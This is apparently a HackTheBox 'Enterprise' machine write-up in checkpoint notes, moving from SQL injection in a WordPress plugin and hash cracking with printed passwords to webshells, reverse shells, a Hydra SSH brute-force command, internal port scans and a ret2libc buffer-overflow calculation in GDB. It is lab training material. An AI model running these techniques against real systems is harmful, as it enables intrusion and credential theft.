---
title: '[HackTheBox] "Enterprise" machine writeup (Checkpoint style)'
date: 2020-08-17T12:27:10+03:00
tags: [writeup, binary-exploit, hackthebox]
---

## Legend:
- `[*]` – Info
- `[+]` – Progress
- `[-]` – No use / Dead end
- `[!]` – Important
- `[?]` – Maybe useful
- `==========` – Next stage

## Files:
https://mega.nz/folder/QNFVDa4I#zkNofatfEJfrl2KSw2H-yg

## Checkpoints:

`[*]` **443/tcp**: Apache 2.4.25

`[*]` Possible hostname: **enterprise.local** / **enterprise.htb**

`[+]` Username: **jeanlucpicard**

`[+]` Interesting endpoint: **/files** (Status: 301)

`[+]` Interesting file: **/files/lcars.zip**

`[!]` PHP files!

-  `[*]` Mentions "wp-config.php". This is WordPress plugin. Moving to **80/tcp**.

`===========`

`[*]` **80/tcp**: Apache 2.4.10 + WordPress 4.8.1

`[*]` X-Powered-By: PHP/5.6.31

`[-]` Unusual header "Link": http://enterprise.htb/index.php?rest_route=/

`[-]` Themes:
- twentyfifteen 1.8
- twentysixteen 1.3
- twentyseventeen 1.3

`[-]` plugins:
- akismet

`[?]` XML-RPC is enabled.

`[?]` Found mentions about "Wordpress <= 4.8.2 SQL Injection"

- `[?]` Requires access to admin dashboard

`[?]` CVE-2017-14723

- `[*]` Before version 4.8.2, WordPress mishandled % characters and additional placeholder values in $wpdb->prepare, and thus did not properly address the possibility of plugins and themes enabling SQL injection attacks.

`[+]` Username: `william.riker`

`[+]` lcars plugin:

- Location: http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php:
```php
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
```

- Location: http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php:
```php
    $query = (int)$_GET['query'];
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
```

`[!]` `$_GET['query']` in `lcars_db.php` is vulnerable to SQL injection!

`[*]` http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=69 yields "YAYAYAYAY."

`[*]` http://enterprise.htb/?p=69 is "YAYAYAYAY." post.

`[-]` We won't be able to extract drafted/hidden posts this way. Running SQLmap.

`[!]` Extracted DBMS system users password hashes.
- `[+]` Cracked them using https://hashes.com/en/decrypt/hash

`[+]` "wordpress" database:
- `[+]` Extracted `william.riker`'s password hash.
- `[+]` Found clear-text passwords inside a drafted post.

`[+]` "joomladb" database:
- `[+]` Extracted `geordi.la.forge`'s and `guinan`'s password hashes.


`[+]` Building custom password list for JTR and running it against hashes.

<ul markdown=1>

- `[*]` `root@parrot# john william.riker.hash -wordlist=passwordlist.txt`

- `[+]` Password is: `u*Z14ru0p#ttj83zS6`

</ul>
<ul markdown=1>

- `[*]` `root@parrot# john geordi.la.forge.hash -wordlist=passwordlist.txt`

- `[+]` Password is: `ZD3YxfnSjezg67JZ`

</ul>
<ul markdown=1>

- `[*]` `root@parrot# john guinan.hash -wordlist=passwordlist.txt`

- `[+]` Password is: `ZxJyhGem4k338S2Y`

</ul>

`[+]` Logged in as `william.riker` to **wp-admin/**. Uploading webshell.

`[+]` Jumped to a reverse TCP shell.

`[-]` We are inside of Docker container

`[*]` **/home/user.txt**:
```
As you take a look around at your surroundings you realise there is something wrong.
This is not the Enterprise!
As you try to interact with a console it dawns on you.
Your in the Holodeck!
```

`[-]` Trying SSH bruteforce using hydra:
```
root@parrot# hydra -L users.txt -P passwordlist.txt -e nsr -s 22 -o "/media/psf/Home/Downloads/results/10.10.10.61/scans/tcp_22_ssh_hydra.txt" ssh://10.10.10.61
```
`[*]` Moving to **8080/tcp**.

`===========`

`[*]` **8080/tcp**: Apache 2.4.10 + Joomla 3.7.5

`[*]` X-Powered-By: PHP/7.0.23

`[-]` **robots.txt** contents:
- `/joomla/administrator`
- `/administrator`
- `/bin`
- `/cache`
- `/cli`
- `/components`
- `/includes`
- `/installation`
- `/language`
- `/layouts`
- `/libraries`
- `/logs`
- `/modules`
- `/plugins`
- `/tmp`

`[-]` HTTP backups:
- [http://10.10.10.61:8080/index.php/2-uncategorised/index.bak](http://10.10.10.61:8080/index.php/2-uncategorised/index.bak)
- [http://10.10.10.61:8080/index.php/2-uncategorised/index copy.php/2-uncategorised/1-romulan-ale](http://10.10.10.61:8080/index.php/2-uncategorised/index%20copy.php/2-uncategorised/1-romulan-ale)
- [http://10.10.10.61:8080/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-romulan-ale](http://10.10.10.61:8080/index.php/2-uncategorised/Copy%20of%20index.php/2-uncategorised/1-romulan-ale)
- [http://10.10.10.61:8080/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-romulan-ale](http://10.10.10.61:8080/index.php/2-uncategorised/Cop%20(2)%20of%20index.php/2-uncategorised/1-romulan-ale)
- [http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.1](http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.1)
- [http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.~1~](http://10.10.10.61:8080/index.php/2-uncategorised/index.php/2-uncategorised/1-romulan-ale.~1~)

`[+]` Internal IP Leaked: **172.17.0.3**. I want to do a ping sweep after I get in.

`[+]` Logged in as `guinan` to **/**.

`[-]` No access to **/administrator**

`[+]` Logged in as `geordi.la.forge` to **/administrator**. Uploading webshell.

`[+]` Jumped to a reverse TCP shell.

`[-]` We are inside of Docker container

`[*]` **/home/user.txt**:
```
As you take a look around at your surroundings you realise there is something wrong.
This is not the Enterprise!
As you try to interact with a console it dawns on you.
Your in the Holodeck!
```
`[+]` Doing ping sweep:
```
www-data@a7018bfdc454:/var/www/html$ for x in $(seq 1 255); do ping -W 1 -c 1 172.17.0.$x | grep from; done
64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.081 ms
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.292 ms
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.081 ms
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.181 ms
```
`[*]` There are 4 hosts.
```
www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.1 1-65535 2>/dev/stdout
172.17.0.1 22 (ssh) open
172.17.0.1 80 (http) open
172.17.0.1 443 (https) open
172.17.0.1 5355 (hostmon) open
172.17.0.1 8080 (http-alt) open
172.17.0.1 32812 open
```
`[*]` **172.17.0.1** seems to be a host
```
www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.2 1-65535 2>/dev/stdout
mysql [172.17.0.2] 3306 (mysql) open
```
`[*]` **172.17.0.2** is a MySQL container (`15af95635b7d`)
```
www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.3 1-65535 2>/dev/stdout
a7018bfdc454 [172.17.0.3] 80 (http) open
```
`[*]` **172.17.0.3** is a Joomla container. We are here. (`a7018bfdc454`)
```
www-data@a7018bfdc454:/var/www/html$ ./nc -vz 172.17.0.4 1-65535 2>/dev/stdout
172.17.0.4 80 (http) open
```
`[*]` **172.17.0.4** is a WordPress container (`b8319d86d21e`)

`[+]` Checking what's mounted there.
```
www-data@a7018bfdc454:/var/www/html$ mount -l
/dev/mapper/enterprise--vg-root on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /var/www/html type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```
`[!]` **/files** sound familiar, isn't it? Even contents are the same.

`[!]` We've seen **/files** endpoint on **443/tcp**. And **443/tcp** is open only on host.

`[+]` Copied webshell to **/files**.

`[+]` Jumped to a reverse TCP shell.

`[+]` Got **user.txt**! Proceeding to rooting the box.

`============`

`[!]` `linpeas.sh` showed unusual binary **/bin/lcars** which has SUID bit set.

`[*]` Running **/bin/lcars** asks for access code. Using Cutter to determine it.

`[+]` The code is: `picarda1`.

`[+]` Detected Buffer Overflow vulnerability in "Security" (`4`) menu entry.

`[+]` Protections (their absence):
```
limitedeternity$ checksec -f ../loot/lcars
    Canary: false
    CFI: false
    SafeStack: false
    Fortify: false
    Fortified: 0
    NX: false
    PIE: DSO
    Relro: Full
    RPATH: None
    RUNPATH: None
```

`[+]` Also, `linpeas.sh` showed, that ASLR is disabled.

`[*]` I don't see any interesting addresses to redirect execution flow to. Thus, ret2libc may be the way.

`[+]` Yes, it is:
```
root@parrot# ldd lcars
<...>
libc.so.6 => /lib32/libc.so.6 (0xf7dbf000)
<...>
```
`[+]` We've seen, that **/bin/lcars** listens for input on **32812/tcp**. Moving there.

`===========`

`[*]` **32812/tcp**: Vulnerable binary
```
root@parrot# gdb -q ./lcars
gef➤ break main
gef➤ run
Starting program: /media/psf/Home/Downloads/results/10.10.10.61/loot/lcars

Breakpoint 1, 0x56555ca0 in main ()

gef➤ disassemble main_menu
   <...>
   0x56555ad7 <+633>:	call   0x565555c0 <__isoc99_scanf@plt>
   0x56555adc <+638>:	add    esp,0x10
   0x56555adf <+641>:	sub    esp,0x8
   0x56555ae2 <+644>:	lea    eax,[ebp-0xd0]
   0x56555ae8 <+650>:	push   eax
   0x56555ae9 <+651>:	lea    eax,[ebx-0x2138]
   0x56555aef <+657>:	push   eax
   0x56555af0 <+658>:	call   0x56555560 <printf@plt>
   0x56555af5 <+663>:	add    esp,0x10
   <...>
```
`[*]` Setting breakpoint right after `printf`.
```
gef➤ break *0x56555af5
gef➤ c

<...>

Enter Security Override:
AAAAAAAAAAAAAA

Breakpoint 2, 0x56555af5 in main_menu ()

[ Legend: Modified register | Code | Heap | Stack | String ]

<...>
───────────────────────────────────────────────────────────────────── stack ────
0xffffcf10│+0x0000: 0x56555ec8  →  "Rerouting Tertiary EPS Junctions: %s" ← $esp
0xffffcf14│+0x0004: 0xffffcff8  →  "AAAAAAAAAAAAAA"
0xffffcf18│+0x0008: 0xffffd0c8  →  0xffffd108  →  0xffffd138  →  0x00000000
0xffffcf1c│+0x000c: 0x56555882  →  <main_menu+36> sub esp, 0xc
0xffffcf20│+0x0010: 0xffffcf74  →  0x00000000
0xffffcf24│+0x0014: 0xffffcf70  →  0x00000000
0xffffcf28│+0x0018: 0x00000003
0xffffcf2c│+0x001c: 0x00000000
<...>
```
`[!]` Buffer starts at **0xffffcff8**.
```
gef➤  info frame
Stack level 0, frame at 0xffffd0d0:
 eip = 0x56555af5 in main_menu; saved eip = 0x56555c5f
 called by frame at 0xffffd110
 Arglist at 0xffffd0c8, args:
 Locals at 0xffffd0c8, Previous frame's sp is 0xffffd0d0
 Saved registers:
  ebx at 0xffffd0c4, ebp at 0xffffd0c8, eip at 0xffffd0cc
```
`[!]` EIP is at **0xffffd0cc**.
```
gef➤  p/d 0xffffd0cc - 0xffffcff8
$1 = 212
```
`[!]` Length of area we need to overwrite is **212**.

`[!]` *These were machine-independent calculations.* Moving to the target machine.
```
www-data@enterprise:/var/www/html/files$ gdb -q /bin/lcars
(gdb) break main
(gdb) run
Starting program: /bin/lcars

Breakpoint 1, 0x56555ca0 in main ()
(gdb) info proc map
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56557000     0x2000        0x0 /bin/lcars
	0x56557000 0x56558000     0x1000     0x1000 /bin/lcars
	0x56558000 0x56559000     0x1000     0x2000 /bin/lcars
	0xf7e11000 0xf7fc5000   0x1b4000        0x0 /lib/i386-linux-gnu/libc-2.24.so
	0xf7fc5000 0xf7fc7000     0x2000   0x1b3000 /lib/i386-linux-gnu/libc-2.24.so
	0xf7fc7000 0xf7fc8000     0x1000   0x1b5000 /lib/i386-linux-gnu/libc-2.24.so
	0xf7fc8000 0xf7fcb000     0x3000        0x0
	0xf7fd2000 0xf7fd5000     0x3000        0x0
	0xf7fd5000 0xf7fd7000     0x2000        0x0 [vvar]
        <...>
```
`[!]` libc is between **0xf7e11000** and **0xf7fc5000**. We need to find an "sh" string there.
```
(gdb) find 0xf7e11000, 0xf7fc5000, "sh"
0xf7e1f65e
0xf7e1f6a0
0xf7e2065b
0xf7e20c3c
0xf7e22b30
0xf7e2346f
0xf7e23716
0xf7f6ddd5
0xf7f6e7e1
0xf7f70a14
0xf7f72582
11 patterns found.
```
`[!]` I'll say that "sh" is at **0xf7e1f65e**.

`[*]` Now, we need to pinpoint locations of necessary functions.
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c060 <system>
```
`[!]` `system` function is at **0xf7e4c060**.
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
```
`[!]` `exit` function is at **0xf7e3faf0**.

`[+]` We're ready to create an exploit now!

`[+]` Got **root.txt**!
